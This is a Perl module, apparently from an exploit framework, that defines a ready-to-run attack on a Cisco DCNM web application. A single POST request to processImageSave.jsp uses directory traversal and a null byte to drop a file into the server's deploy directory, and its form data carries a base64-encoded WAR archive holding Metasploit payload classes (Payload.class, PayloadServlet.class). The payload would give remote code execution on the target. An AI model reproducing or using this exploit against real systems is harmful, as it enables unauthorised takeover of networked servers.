package MSFPerlExploits::CISCO::MSF::DcnmUpload;
use parent qw(P1rK3r::Exploit P1rK3r::Services::CISCO);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "DcnmUpload";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'DcnmUpload',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'cues_utility/charts/processImageSave.jsp',
                        PAYLOAD      => 'mode=save&savefile=true&chartid=../../../../../deploy/lPIhPnIHoQK69fWikcx2b.war%00&data=UEsDBBQAAAAAAECAaksAAAAAAAAAAAAAAAAIAAAAV0VCLUlORi9QSwMEFAAAAAgAQIBqS8B0U2jwAAAAnwEAAA8AAABXRUItSU5GL3dlYi54bWydkF1LwzAUhu/7K2IuxeZoB4JSO3QdWPyKbDK8GmkaXTRfNGnd/r2BjbXeevee93w8LyefbrVCvWi9tOYGX5BzPC2S/KR8mS3f6Rz9iDplziH6dvdYzRKcAiw6g54kb63f%2bSC0P0OV4QSgXJZoJWp065ySnIV4EGVkAjB/xgnehOCuAb5Yz4jvDOFWQxMaOADW2XpCYo0j/GBF5UXbKxEGlRqmRaFotaGmurevD5dXHyv5zbdZncOfmWGFK%2bZ9oUVg3ikrA6FspyxrFvv%2bsLcfTI7G6IaOeaT5/F%2bQrlWpYyGI1hRwmsO4HmgjBhw/8AtQSwMEFAAAAAAAQIBqSwAAAAAAAAAAAAAAABAAAABXRUItSU5GL2NsYXNzZXMvUEsDBBQAAAAAAECAaksAAAAAAAAAAAAAAAAbAAAAV0VCLUlORi9jbGFzc2VzL21ldGFzcGxvaXQvUEsDBBQAAAAIAECAaktwey3fThEAAEEhAAAoAAAAV0VCLUlORi9jbGFzc2VzL21ldGFzcGxvaXQvUGF5bG9hZC5jbGFzc5UYCXgU5fW92dmd2cnkYMICw6GIiktORYy4eDSEINFcsMEYUXHYnZCVzU7cmZCg1lpFbbX3KVbUUjT2sEK0m2jUerR41LOtWq3Ws7TW1lq1d5W%2bN7NLNsliaT74z/e/%2b5p97KO77wOAY4QaBR6BvRL8TgGB599L8JYCftirwKnwBwWWwtu8/aMMf%2bL5HRn%2bzDfvMvhfFLDhPRne580HMvxVhr8pMAP%2bzsM/JPgnz/%2bS4d88/4eHD3n4SAER9tEbBBmRTlDgjU9GUUY/LwMKSigTcQzyVpGxiMFUHoplLJGxVMYyvp8moyZjuYzTZQzJOEPCmQoci7P4mU4reE/B2ThHwrkyziO6eIiMh/LRfAUPwwU8HO4H9096WsEj8EimsTB7BPEgPTlKxrCEi4JYgZUkO1ZJWM2bGgVr8WgJj5FxsYzHMq4lEh6nwGqsk/F4GZfKeEIQI7iMhxNlPEnCk5npU2T8BM/1CnThcgkbFDiX9XMurpCxkUmslPFUCVcpECce6bxJwtMU2EgGwtMVSGCzhC0KbMJWHtpoIDnpeAEP7TKulnGNhFEJOyRcK%2bEZMnbKeKaMXQpsxrN4WMfD2WyIvTKew4o5V8b1ZE88j/VnSLhBgcsxJmFcgSuYrqnAVewVV2C3hBsl7JExIeH5ClyDmxS4GpMM38tDitFZPPTJeAGLk5bRltCRsF/CzQpswwEFrsVBVu4WHi6U8SKGv1jGT/J8iYyf4vlSNsanJbxMgZuZtoiX0wq3Bun4CpbgShmvYk1%2bRsbP8s3VPFwj4ecU2AV7GezztMIv8PEXefUlvniHn3yZh6/w8FVybPwar77Owzd4%2bKaM1yoYgQ%2bCuA2v45NvMaPXy7id5xtkvFHGm2T8toQ7EKS26PrW%2bpZGBK35fGOzUZs0Uhtro046kdq4jLy8vb5j1fpoYztCoCm6vr7pTAQ8y9usaIsiBE%2brP6N%2b/ao2xhA4MZFKOCcj%2bMKLzkAQG6y4SVOvkUghzAivm0qAwZTGwZjZ5ySslI0wbSCdcMzG3g1mPG7GVyaShGBJOO9hQ9Kw7WVTMXknCauW3xBeCb8j4U7ib4NlObaTNvoQouH9UE2pvn6HnppG7/jTtn5n8mk%2biQPwX7bRdE5Lm42DZqzfMTYwxwvDBUALqVc14vHGQcdM2SQ%2bMdudSMWbUisS6UlSTxCyANac3IQiZaV7jWTiQmJjQfggHkjxhG2bMQfhqELg6wp6xYmxpGtqFZ6GZxCmuzD9TiJZ2562%2bsy0kzDJmFqv6Rh2X9JKOLXtxpakZcQRZk7Gt7w/kYybaRVvxltUHMJbVfwufo%2b8qSbGtlbx%2b3gLQmntOLKauOGo%2bAO8TcUf4u0q7mIelHEDqLgbXiYEl9h9xgCpVaxxevtUHIZXVbwD7yS15%2btAxR8xAbEmnkiTPJhRcQTv5NWoCs/B8yrehXeTZ64gyfrMeD6ZMeb4HrwXwR/1SOHRRBzvk/DHKt6PD6j4ID6k4k/wpwglkwXYgw%2br%2bAjz41u7phkBiOUex%2bmzIyo%2bio8hHDFVfx3pfttpMVLGRjPt6QdB/5i7ovrGaDutBqw06f6QPIR00ZiKpbe4kZcDLy94OitfXflBwkr6mYqP4xMSPqniU/g0hcNk%2b5Jq%2bUiFl9goSrWLtM9welR8Bn8u4S9U/CU%2bq%2bJz%2bKyEpO1f4QsqvgjPqPAkPIFQbJtOfmyVTsoFEv5axZfwZRV/g69MIN%2b24XzyaxVfxdckfF3FN/BNhEPH71utaH%2bsp8V0eqz4/hxEpoz19FqkLKFyUMXf4l7Syvib/XAq/o69zt/c3ramg0RcQn%2b8XdUWpcr1exXfwj%2bo%2bDb%2bke7SxkAEYW5Oi8u3OGZ9Om1syUtCKv4JHyLtNEXbqpcuPe6E6mNUfAf/zAp%2bN%2bevKdOpJUdR8S/43gRb1hRwABXfxw/Iofptc6VF6WRGPooGK5Ui1bhi/BWfRZg3hbd8M%2beUzq%2bjVmyT6TBff0MIjR%2bb6c1mevzy7yr%2bA/%2bp4r/w3%2bQ/eaxOcDDyzwHKzB4VO6foiek5l10m5WcCzk9Nnq0pNenjqchzvw5rk5midEg6KMrqaX519XySKeqQotqNtEHsmWkij/OZ9f%2bo%2bCHuVfEjzgrFuVLkAqvwIvya4GpV3CeAKqAg5BIasbfCcIx8kxKu23MMUYbtp8q2pbbdTPdSwvWq3ZyJd/XJ5Pi1KvgEkcw86XnacjzLrbC8ujprIgDX3KjVn45RqMjdFK%2bR2traKWhilKJrGzhPdydihkOCPS34eQiogkTCCzK%2bqwpBQVGFIkGlTM7P%2bzzt1disihpVKBZKyONpl3YmWWN/ociLnI6etDXghfB%2bM7cT2Li2hFIKKqFMhcfhCRWeAsqAvlq7R4VX4FWKotoNiZQKv%2bEkItaYg8Tza/C6KkzjBFqab3UjtkmFN%2bBNVdDwblUoh8dUYTpDITEdEmZQaNfQaibLOYtlmDG1JHV3UwgJujCbipEwRxXmCvN4dYgqHCrMp2AVDlOFBcLhfHaEKhzJqBYKR/FtmEqqZdekyKskYZEqVAiVqlAlVKvwKEtUwpmvxjb7yO8ciwrOz1w5jcQg8cf1m3mp6bF6zVx4jae6ZtI%2b%2b/G8/Hzcajkrrf5UfgYbD6O2vFOJ%2bpRWg/FODxdsRqS02Zc02HFmhBsaCoIEDCqBKUqO1QfV4WRLO3cMjpWrBuXExxrTdn203s5F86KP7VXy2zUyv9dJzCrcznFP5o8lLZsEKSJa2Y5kC%2bk%2bRgCO2WH29nmdZSBuJin23YaVmtpSgq7fYFvJfofygtNDFggX7vn8vZvi3KQdHp7YThWGDqTNXmvz5L4wm7IWFcpi3FM2GCkrRdGZ9FjxkYQISwtgOEicS/%2bfhnKi2aeNnzWlHHMjO6FMHmybtD2AlprIoTYbyX6zrZshmgoiLrLz7fP/c7hfuGI2tJE2U45n2bLwlEY34NqMsq7ipiy7M3FAC5MvTAtP/qJwc52VJuSV4YP9ZOBXecpb059yEhyBCsdAbhOaEI7ZY3ZzSnIxhHDBD6e8I1JgzKSPogmksofk9ERqQjmdGT5QXDFoYzptpXOgZRPSt8lB57eTpknfUmL4NBZO9SKoLdU4mHAmMLDcspKmwd13R1c7fRxOm/IRR8mOCHr9F8Inwh//xeW9yZc7bXYnyfq1HgZWWMeatUSpvHkKF8tydbLAQ/KMRGozdQkIJxSIrnUHGV7SgJFw3FaLkgk5f2mfV9yoGnWk3aya3xlvsR2TFCxwBQ8dwBw%2biyN%2b/DavWrLu7P4NdjalyqRH7txsTt2FPuKWk%2bHC65azxUoo2lLjDSDC7Jw/TGkOWapuK%2b0VjSP/R8bP2VRh/DkHKsRNk/vbQNidAkaM6xPZLJ8Jr41c5iXkiU3frDznnRB7hT9fC0dkUYwKpuM2hjZ/MZuD3oZbdc/JWVdkQ7/7awRpgfZNLsM%2b%2bmCnApwlVaCrcwksDk/QaM6HDth%2buY/qJyMdb%2bWWHZBcg5VMZo3FOCTm383JQV6t7E8mKa8Wxc3uRMps8L7mmgoFGonX/PGdZkFjq2kq5MnNOdTTp/5S4%2bo7ZQ40pSjrpmJTuo/xxv0ASZUR5FX6/CBwPcgcTNgO0Rb7%2bu0eDotca0VFocewWyhj5ywdMC/oN5L2pKSfC2pK%2bqLt/m7i67P63A/PLKaGHoOwYQM17OGGQl0Od4sckpQLe6kE1TtTKt5%2bMav%2bRwswCaWUSMXNQS6hHDFNHFFNByiljsV8uh9vDL1oHfE7tzC/ua4skDRTG7kKBmL81PGoNHAANLnUysb76maLWhGOhcbWU5uboqv2/2CYd%2bux0WwNmOkGw85rePJhCnAPh4EIjwCAH2Zzm0yr2dwYuzN9Dbjzk9n5KfdcAeTfnmj8Oe2m0Yz8vmIEcLf7%2b3cQfgG/BIGvxS0QIBAQzxkDoWsEfM3lILaMgZ/WgaoMSGU1ZbUZkDMQ1BQaMlDUWqWpGSiOiLq4B0oqdTEDJTyUVmplGZgW8ev%2bPXCepmnlozA9EtADGQh1jsGMrixWPpjJ%2bGZ5%2bEZAj0i6lIHZLpQu6f4RmBORq3S/Lo/CXBftvM5K7RCd2Dg0A/NpfZi2IAOHj8IRdQG6YLJSKHADnks3oYAYH4UjM7CwM8eEzC8nMiFPZSLokg9qRzF5xdtU87pIL8pAOAOLOquq9SKXpQqtkuhrpKHqbTCzSqtxwRlMq6UnLszRSCB7%2bPaY8dvF3u0YHNulKyOwJKJW6iojO04nrdaNwvHSvbC0y6edMAqRaJeoLYt2%2bXVicWa0yzVINAMnRor14gycRDrn%2bWSap8Mpo1BPT2d0%2bfQieudS46cKvdOD0UiJr640VKqX3LcDjvPVlYXKypQdcKReEipdTLrZBoEhmJndLZ8ODYRtaxkO7XtxaymNjw4JJ%2bvSHrjasxBrSx6GxutgdTnM0FaK98KpXb5hWEXMNekybU/j7em0be4cggWRIMkV8ORqZaHamDNXlAy0E4QSCbKMawhMdMG8y06XhuZZj8cwL4ZwuFKLah1ZB5ArtbWs6UiQzOIulJC8HcqG4YxI0TB0RtQheEBX9sBluqKd6Rps9hh0kfrJ587S1mXg7BE4J1I0BGsJwLPoSWNwrmuf9Rk4L1KsGaOwQYt5YpZDnMVET0q92BWS7WAyjml5L7sjRWOwkdyth3k4SQ/ugfIxSJBbheQROD9SPMScbOriXTJSopdkoJdMS1OK8VnkeDT1kYt4vsRm3wMd2gXMTTqQ5cYmhZaDQxoth6UuZwGPM9cNVNa0y%2bP90E//mIxv8f1gE/ISkRZORB2Dzbm40AYoHiq1Qde9vdDQtozAhR53F5FtIqWu9%2bil5Ejleimt6OLiqOssb4%2bBSFg%2bqRfpxPMlzLNeOgKf2g2CcLzQJZwNLTRfJFwCqykNPUv/RcpNqyljPQfPewkJ1tKZRHNTRY6lS5kljxfKO60cOlUcOeK0MrhHjvirdX8GPt1VFxBuhDJd1P2%2bEKWYy4b2vcVpqc7LeUwsQCR%2bBS%2bAxr9VZcm9T8SKaH5lDC7vqhyBrRH/GFxBdK/kpDQGV9HyMxn47BhcTTq6povNq32OzOu7Fz4/Al/gYPhiRK5%2bGE5gNr5UFwwFiSmFkhflyy9XVKCu%2bEJBdt6vdEWIr6/uB9u%2b7/khmJOT8mskYbUnJZnXy5tfp7AIaN/IWfryPEt/0w21YNbUfrqpYkuL2ZDTOA2PwTbW1HUZ%2bNZutwY8ThXi2kmafwlezlaKs0glAs2t2DwM12%2bDeVnWhmE7Z8obPOYqRuHG5sqHJ9/elH%2b7B2Qy2MxdtPv2Llf9Cv86laVTSVSYm0OzGCroKQX6NpC1HUPg17K2zj18BV7NPlxMTIs0LyS832nBVorVndtA55xUVUmkKLW2kgp3Xgd%2bbK3OvX8NXs%2b%2bv4teB2i%2bbQxuJsK3NBOeoZbKKh/lvFs7OQqqxMXD8F3yd8bzvW3QQNPFEVH7PnvSDzhJ7ntLuy27mUuM/tC/A1RmgKqrvosObuds5hbFWzuH9t0zBruI0u6I6Kvzh/z8YAccEfKLO0HVxWEYzsAdnbpYGSKfuDMDP%2brc6qcwesHNsoQiw0izYrwBb3piYJDEkOnsQ3p/YkVZ7Ryqz2Vn83g6tlSURTIwcvK8G%2bBKV6eXzhPPqxMrfCFCN9pCqr6LHTxX3oP06m7SdYvuD4lL5twESkgUzyMjhMQ6Mcd7gDZSiMoyRXyYACUGLOGFGF8y50ZaBtxTlmWrRPw/x76bOX0IVhO9MZL1lAqifg%2b9qquYQ5LeSwzNYULuMiT6d0Ipc8gHo0MgVrRUEG9jlJ0JRzEZpIXfn3W63y0N5OdiRdRTiwy/3d/o1LvOC3Ccdt8o/HgY7s/AA3fAg9pDtLsDfqL9dBgeJLvdAdcP026Pu2zUHnZvt3tJAv4LUEsDBBQAAAAIAECAakvm/naMygEAACwDAAAvAAAAV0VCLUlORi9jbGFzc2VzL21ldGFzcGxvaXQvUGF5bG9hZFNlcnZsZXQuY2xhc3ONUl1PE0EUPUNnO7CsFIt8VARBBLd8uIA%2bUcOLMUCyUdIaDfFpoJOyZtmtu1OCv4hnXkAh8AP8UcY7tYVqE2CTvTdz77nnnrl3fv0%2bvwKwglc2HIwKjPWiYOMxxgWe9GMCkwJPbQhMGTNt4xlmBJ4LzArMMWTfBFGg1xkybvETA38bVxUdkkbEYFXjDaUZyq7/VR7KIy9VyWGotLevdd3bJFP5Gyirbw2V6tKdsLQeR6kqmU72u6M9VdcBBQReCLgOBpBjGDQcXiijmlfRSRDVGEh30cE8FhiGbrLX9QKLDpbw8p/aj/uJklXD6TlYRk5gxcGqaVA4UFqm9TAOtLctv4exrLb0MUzefgGG/E2HciOK5G6ouqpa4Gt9bdVB7G196Ijmu4XQAg5kQLkR94v//yCaY5u734gZ%2bmpKf04CrRKGUbfotyVsE1UrUTIZv/tGzUZWqmWiO7R3FFJ2L4xThWn006NjeEAvMEOeNkh2kE4PydPmYM2fgZ3AfIyC7fQsOHoMjF%2biZyeTz1R%2bgB%2bD%2byfNKoeAFnmOPIYIaEpeUwcTm1r8iSzD%2bwuIHSLvXeMFfoq%2bY1hrfOkUtmEQGEGhiX5Ef5YYhimCP1BLAwQUAAAACABAgGpLDg9F/yMAAAAjAAAAHgAAAFdFQi1JTkYvY2xhc3Nlcy9tZXRhc3Bsb2l0LmRhdAsuSCzPszXi8vHwDw6xNTQy1zMAQkMunwD/oBBbExNzEy4AUEsBAhQAFAAAAAAAQIBqSwAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAFdFQi1JTkYvUEsBAhQAFAAAAAgAQIBqS8B0U2jwAAAAnwEAAA8AAAAAAAAAAAAAAAAAJgAAAFdFQi1JTkYvd2ViLnhtbFBLAQIUABQAAAAAAECAaksAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAEMBAABXRUItSU5GL2NsYXNzZXMvUEsBAhQAFAAAAAAAQIBqSwAAAAAAAAAAAAAAABsAAAAAAAAAAAAAAAAAcQEAAFdFQi1JTkYvY2xhc3Nlcy9tZXRhc3Bsb2l0L1BLAQIUABQAAAAIAECAaktwey3fThEAAEEhAAAoAAAAAAAAAAAAAAAAAKoBAABXRUItSU5GL2NsYXNzZXMvbWV0YXNwbG9pdC9QYXlsb2FkLmNsYXNzUEsBAhQAFAAAAAgAQIBqS%2bb%2bdozKAQAALAMAAC8AAAAAAAAAAAAAAAAAPhMAAFdFQi1JTkYvY2xhc3Nlcy9tZXRhc3Bsb2l0L1BheWxvYWRTZXJ2bGV0LmNsYXNzUEsBAhQAFAAAAAgAQIBqSw4PRf8jAAAAIwAAAB4AAAAAAAAAAAAAAAAAVRUAAFdFQi1JTkYvY2xhc3Nlcy9tZXRhc3Bsb2l0LmRhdFBLBQYAAAAABwAHAPkBAAC0FQAAAAA%3d',
                        TEXT         => 'Sending First Exploit Request On : /cues_utility/charts/processImageSave.jsp',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;